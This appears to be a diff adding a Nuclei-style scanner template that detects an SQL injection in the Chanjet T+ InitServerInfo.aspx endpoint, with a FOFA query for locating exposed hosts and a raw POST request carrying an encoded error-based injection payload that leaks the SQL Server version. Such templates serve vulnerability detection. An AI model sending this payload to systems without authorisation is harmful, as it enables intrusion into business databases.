@@ -1,0 +1,31 @@
+id: chanjet-TPLUS-InitServerInfo-sqli
+
+info:
+  name: chanjet-TPLUS-InitServerInfo-sqli
+  author: linfeng7z
+  severity: critical
+  description: 畅捷通-TPlus InitServerInfo.aspx 接口存在SQL注入漏洞。
+  tags: chanjet,t+,tplus,sqli
+  metadata:
+    fofa-qeury: app="畅捷通-TPlus"
+    veified: true
+
+http:
+  - raw:
+      - |
+        POST /tplus/UFAQD/InitServerInfo.aspx?preload=1 HTTP/1.1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Host: {{Hostname}}
+        Content-Length: 94
+        Content-Type: application/x-www-form-urlencoded
+        
+        operbtn=create&ServerID=%27%2b(select%0d%0a1%0d%0awhere%0d%0a1%0d%0ain%0d%0a(@@VERSION))%2b%27
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(body, 'SQL Server')"
+        condition: and
